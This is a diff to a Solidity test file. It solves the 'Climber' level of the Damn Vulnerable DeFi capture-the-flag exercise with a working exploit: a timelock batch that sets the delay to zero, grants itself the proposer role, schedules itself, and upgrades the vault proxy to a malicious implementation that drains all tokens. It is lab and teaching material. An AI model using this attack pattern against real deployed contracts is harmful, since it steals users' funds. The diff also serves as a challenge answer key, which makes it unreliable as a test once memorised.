@@ -8,6 +8,72 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+// add this above ClimberChallenge
+contract EvilVault is ClimberVault {
+    function drain(address token, address recovery) external {
+        DamnValuableToken(token).transfer(
+            recovery,
+            DamnValuableToken(token).balanceOf(address(this))
+        );
+    }
+}
+
+contract ClimberAttacker {
+    ClimberTimelock timelock;
+
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+    bytes32 salt;
+
+    constructor(ClimberTimelock _timelock) {
+        timelock = _timelock;
+    }
+
+    function attack(address vault, address token, address recovery) external {
+        EvilVault evil = new EvilVault();
+
+        targets = new address[](4);
+        values = new uint256[](4);
+        dataElements = new bytes[](4);
+
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeCall(
+            timelock.updateDelay,
+            (0)
+        );
+
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeCall(
+            timelock.grantRole,
+            (PROPOSER_ROLE, address(this))
+        );
+
+        targets[2] = address(this);
+        values[2] = 0;
+        dataElements[2] = abi.encodeCall(
+            this.schedule,
+            ()
+        );
+
+        targets[3] = vault;
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)",
+            address(evil),
+            abi.encodeCall(EvilVault.drain, (token, recovery))
+        );
+
+        timelock.execute(targets, values, dataElements, salt);
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,8 +151,16 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        ClimberAttacker attacker = new ClimberAttacker(timelock);
+
+        attacker.attack(
+            address(vault),
+            address(token),
+            recovery
+        );
     }
+
+    // climb to propose something (be admin), and then climb to sweeper
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
